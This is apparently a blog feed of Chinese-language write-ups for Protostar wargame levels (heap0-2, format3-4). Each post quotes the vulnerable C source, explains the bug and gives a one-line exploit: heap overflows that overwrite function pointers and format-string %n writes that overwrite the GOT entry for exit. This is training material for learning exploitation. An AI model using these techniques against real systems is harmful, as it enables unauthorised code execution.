class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">int</span> auth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> *<span class="title">auth</span>;</span></span><br><span class="line"><span class="keyword">char</span> *service;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">line</span> + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, <span class="built_in">line</span> + <span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>但是因为命名不规范，所以程序计算的是<code>struct auth *auth</code>的大小</p><p>而不是计算<code>struct auth {  char name[32];  int auth;};</code>的大小</p><p>因此它只有4个字节，但是malloc将它与8字节对齐</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>本意应该是使用UAF,但是我们给service提供长一点的字节，就可以覆盖<code>auth-&gt;auth</code>了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print &quot;auth A\n&quot; + &quot;service&quot; + &quot;A&quot;*32 + &quot;\n&quot; + &quot;login&quot;&#39; | .&#x2F;heap2</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap2_6.jpg" data-fancybox="group" data-caption="heap2_6" class="fancybox"><img alt="heap2_6" title="heap2_6" data-src="https://dblu3.github.io/img/Protostar/heap2_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap2&quot;&gt;&lt;a href=&quot;#Heap2&quot; class=&quot;headerlink&quot; title=&quot;Heap2&quot;&gt;&lt;/a&gt;Heap2&lt;/h1&gt;&lt;p&gt;Heap2: Use-After-Free(UAF)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap1</title>
    <link href="http://yoursite.com/2018/09/15/Protostar-heap1/"/>
    <id>http://yoursite.com/2018/09/15/Protostar-heap1/</id>
    <published>2018-09-15T02:44:40.000Z</published>
    <updated>2018-09-15T13:24:25.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap1"><a href="#Heap1" class="headerlink" title="Heap1"></a>Heap1</h1><p>Heap1是一个堆溢出漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">internet</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> priority;</span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">internet</span> *<span class="title">i1</span>, *<span class="title">i2</span>, *<span class="title">i3</span>;</span></span><br><span class="line"></span><br><span class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i2-&gt;priority = <span class="number">2</span>;</span><br><span class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p><a href="https://dblu3.github.io/img/Protostar/heap1_1.jpg" data-fancybox="group" data-caption="heap1_1" class="fancybox"><img alt="heap1_1" title="heap1_1" data-src="https://dblu3.github.io/img/Protostar/heap1_1.jpg" class="lazyload"></a><br>发现我们可以控制2个strcpy的参数写入任意地址</p><p>第一个strcpy的参数偏移是20(‘F’=0x46)</p><p>第二个strcpy的参数没有偏移</p><p><a href="https://dblu3.github.io/img/Protostar/heap1_2.jpg" data-fancybox="group" data-caption="heap1_2" class="fancybox"><img alt="heap1_2" title="heap1_2" data-src="https://dblu3.github.io/img/Protostar/heap1_2.jpg" class="lazyload"></a><br>反汇编main，发现调用的是puts</p><p>那么接下来的思路就很简单了</p><p>找到puts和winner的地址放到payload中就行了</p><h2 id="查找puts和winnner地址"><a href="#查找puts和winnner地址" class="headerlink" title="查找puts和winnner地址"></a>查找puts和winnner地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap1_3.jpg" data-fancybox="group" data-caption="heap1_3" class="fancybox"><img alt="heap1_3" title="heap1_3" data-src="https://dblu3.github.io/img/Protostar/heap1_3.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap1 &#96;python -c &#39;print &quot;A&quot;*20 + &quot;\x74\x97\x04\x08&quot;&#39;&#96;  &#96;python -c &#39;print &quot;\x94\x84\x04\x08&quot;&#39;&#96;</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap1_4.jpg" data-fancybox="group" data-caption="heap1_4" class="fancybox"><img alt="heap1_4" title="heap1_4" data-src="https://dblu3.github.io/img/Protostar/heap1_4.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap1&quot;&gt;&lt;a href=&quot;#Heap1&quot; class=&quot;headerlink&quot; title=&quot;Heap1&quot;&gt;&lt;/a&gt;Heap1&lt;/h1&gt;&lt;p&gt;Heap1是一个堆溢出漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap0</title>
    <link href="http://yoursite.com/2018/09/14/Protostar-heap0/"/>
    <id>http://yoursite.com/2018/09/14/Protostar-heap0/</id>
    <published>2018-09-14T10:38:41.000Z</published>
    <updated>2018-09-14T15:01:27.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap0"><a href="#Heap0" class="headerlink" title="Heap0"></a>Heap0</h1><p>Heap0是一个简单的溢出漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fp</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> (*fp)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">data</span> *<span class="title">d</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fp</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct data));</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct fp));</span><br><span class="line">  f-&gt;fp = nowinner;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line">  f-&gt;fp();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大致思路是利用溢出，使fp指向<code>winner()</code></p><h2 id="查找winner-地址"><a href="#查找winner-地址" class="headerlink" title="查找winner()地址"></a>查找winner()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap0_1.jpg" data-fancybox="group" data-caption="heap0_1" class="fancybox"><img alt="heap0_1" title="heap0_1" data-src="https://dblu3.github.io/img/Protostar/heap0_1.jpg" class="lazyload"></a></p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>0x804a050-0x804a008=0x48(72)</p><p><a href="https://dblu3.github.io/img/Protostar/heap0_2.jpg" data-fancybox="group" data-caption="heap0_1" class="fancybox"><img alt="heap0_1" title="heap0_1" data-src="https://dblu3.github.io/img/Protostar/heap0_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>后面加上<code>winner()</code>的地址就ok了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap0 $(python -c &#39;print &quot;A&quot;*72 + &quot;\x64\x84\x04\x08&quot;&#39;)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap0_3.jpg" data-fancybox="group" data-caption="heap0_3" class="fancybox"><img alt="heap0_3" title="heap0_3" data-src="https://dblu3.github.io/img/Protostar/heap0_3.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap0&quot;&gt;&lt;a href=&quot;#Heap0&quot; class=&quot;headerlink&quot; title=&quot;Heap0&quot;&gt;&lt;/a&gt;Heap0&lt;/h1&gt;&lt;p&gt;Heap0是一个简单的溢出漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format4</title>
    <link href="http://yoursite.com/2018/09/13/Protostar-format4/"/>
    <id>http://yoursite.com/2018/09/13/Protostar-format4/</id>
    <published>2018-09-13T06:38:30.000Z</published>
    <updated>2018-09-13T09:08:56.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format4"><a href="#Format4" class="headerlink" title="Format4"></a>Format4</h1><p>与Format3差不多</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format4</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code execution redirected! you win\n"</span>);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">buffer</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>观察源码，不难发现，我们想要调用<code>hello()</code>，可以通过把<code>exit(1)</code>的地址改成<code>hello()</code>的地址</p><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>objdump -TR is your friend</li></ul><h2 id="寻找hello-地址"><a href="#寻找hello-地址" class="headerlink" title="寻找hello()地址"></a>寻找hello()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_1.jpg" data-fancybox="group" data-caption="format4_1" class="fancybox"><img alt="format4_1" title="format4_1" data-src="https://dblu3.github.io/img/Protostar/format4_1.jpg" class="lazyload"></a></p><h2 id="寻找exit-地址"><a href="#寻找exit-地址" class="headerlink" title="寻找exit()地址"></a>寻找exit()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_2.jpg" data-fancybox="group" data-caption="format4_2" class="fancybox"><img alt="format4_2" title="format4_2" data-src="https://dblu3.github.io/img/Protostar/format4_2.jpg" class="lazyload"></a></p><h2 id="hello-的偏移"><a href="#hello-的偏移" class="headerlink" title="hello()的偏移"></a>hello()的偏移</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_3.jpg" data-fancybox="group" data-caption="format4_3" class="fancybox"><img alt="format4_3" title="format4_3" data-src="https://dblu3.github.io/img/Protostar/format4_3.jpg" class="lazyload"></a></p><p>偏移是4，所以payload从%4开始</p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>目的是把exit(0x08049724)的地址改为hello(0x080484b4)</p><ul><li>0x8049724: 0xb4(180) 180-16=164</li><li>0x8049725: 0x84(132) 388(132+256)-180=208</li><li>0x8049726: 0x04(04)  260(4+256)-132=128</li><li>0x8049727: 0x08(08)  264(8+256)-04=260</li></ul><p>(0x8049727)的08要加上256是因为(0x8049726)的04&lt;132</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print </span><br><span class="line">&quot;\x24\x97\x04\x08&quot; + &quot;\x25\x97\x04\x08&quot; + &quot;\x26\x97\x04\x08&quot; + &quot;\x27\x97\x04\x08&quot; + </span><br><span class="line">&quot;%164x%4$n&quot; + &quot;%208x%5$n&quot; + &quot;%128x%6$n&quot; + &quot;%260x%7$n&quot; &#39; | .&#x2F;format4</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format4_4.jpg" data-fancybox="group" data-caption="format4_4" class="fancybox"><img alt="format4_4" title="format4_4" data-src="https://dblu3.github.io/img/Protostar/format4_4.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format4&quot;&gt;&lt;a href=&quot;#Format4&quot; class=&quot;headerlink&quot; title=&quot;Format4&quot;&gt;&lt;/a&gt;Format4&lt;/h1&gt;&lt;p&gt;与Format3差不多&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format3</title>
    <link href="http://yoursite.com/2018/09/12/Protostar-format3/"/>
    <id>http://yoursite.com/2018/09/12/Protostar-format3/</id>
    <published>2018-09-12T11:43:43.000Z</published>
    <updated>2018-09-13T09:09:56.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format3"><a href="#Format3" class="headerlink" title="Format3"></a>Format3</h1><p>与Format1、Format2做法基本相同</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbuffer</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  printbuffer(<span class="built_in">buffer</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0x01025544</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %08x :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查找”target“"><a href="#查找”target“" class="headerlink" title="查找”target“"></a>查找”target“</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ objdump -t format3 | grep target</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format3_1.jpg" data-fancybox="group" data-caption="format3_1" class="fancybox"><img alt="format3_1" title="format3_1" data-src="https://dblu3.github.io/img/Protostar/format3_1.jpg" class="lazyload"></a></p><h2 id="定位target的注入位置"><a href="#定位target的注入位置" class="headerlink" title="定位target的注入位置"></a>定位target的注入位置</h2><p><a href="https://dblu3.github.io/img/Protostar/format3_2.jpg" data-fancybox="group" data-caption="format3_2" class="fancybox"><img alt="format3_2" title="format3_2" data-src="https://dblu3.github.io/img/Protostar/format3_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>主要是拆分0x01025544<br><a href="https://dblu3.github.io/img/Protostar/format3_3.jpg" data-fancybox="group" data-caption="format3_3" class="fancybox"><img alt="format3_3" title="format3_3" data-src="https://dblu3.github.io/img/Protostar/format3_3.jpg" class="lazyload"></a></p><p>前面得出偏移是12，所以从%12开始</p><p>把4个字节的数据写入</p><ul><li>080496f4: 0x44(68)  68-16=52</li><li>080496f5: 0x55(85)  85-68=17</li><li>080496f6: 0x02(02)  02&lt;58 与 f7一起 258(256+2)-85=173</li><li>080496f7: 0x01(01)  </li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print </span><br><span class="line">&quot;\xf4\x96\x04\x08&quot; + &quot;\xf5\x96\x04\x08&quot; + &quot;\xf6\x96\x04\x08&quot; + &quot;\xf7\x96\x04\x08&quot; + </span><br><span class="line">&quot;%52x%12$n&quot; + &quot;%17x%13$n&quot; + &quot;%173x%14$n&quot;  &#39; | .&#x2F;format3</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format3_4.jpg" data-fancybox="group" data-caption="format3_4" class="fancybox"><img alt="format3_4" title="format3_4" data-src="https://dblu3.github.io/img/Protostar/format3_4.jpg" 